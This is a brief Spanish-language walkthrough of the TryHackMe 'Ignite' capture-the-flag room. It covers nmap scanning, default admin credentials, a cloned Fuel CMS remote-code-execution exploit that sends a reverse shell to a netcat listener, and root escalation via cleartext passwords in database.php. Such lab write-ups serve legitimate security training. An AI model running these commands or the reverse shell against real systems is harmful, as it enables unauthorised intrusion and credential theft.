 https://tryhackme.com/r/room/ignite
 # Fase de reconocimiento
## Buscamos puertos abiertos
```
nmap -sS -p- -T5 --min-rate=5000 -vvv -Pn -n 10.10.44.44
```
![[Pasted image 20240507183358.png]]
## Reconocimiento de servicios
```
nmap -sVC -p80 -Pn 10.10.44.44
```
![[Pasted image 20240507183435.png]]
## Reconocimiento Web
![[Pasted image 20240507190831.png]]
![[Pasted image 20240507190846.png]]
En robots.txt esta la ruta del panel de iniciar sesión que tiene el admin tiene la contraseña por defecto admin:admin
# Fase de ataque
## Fuel CMS RCE
La versión de Fuel es vulnerable a RCE 
![[Pasted image 20240507191134.png]]
## Para ganar acceso al sistema (Reverse Shell)

1. Copiamos el script de github
```
git clone https://github.com/ice-wzl/Fuel-1.4.1-RCE-Updated
```
3. Nos ponemos en escucha por el puerto 443
```
nc -nlvp 443
```
2. Mandamos la Reverse Shell
```
python3 Fuel-Updated.py http://10.10.44.44/ 10.9.2.193 443
```
[-] ==pwned!==
# Privilege Escalation
En la configuración del fuel de la base de datos están las claves de root en texto claro.
En /var/www/html/fuel/application/config/database.php
![[Pasted image 20240507192414.png]]
```
su root
```
[+] ==pwned!==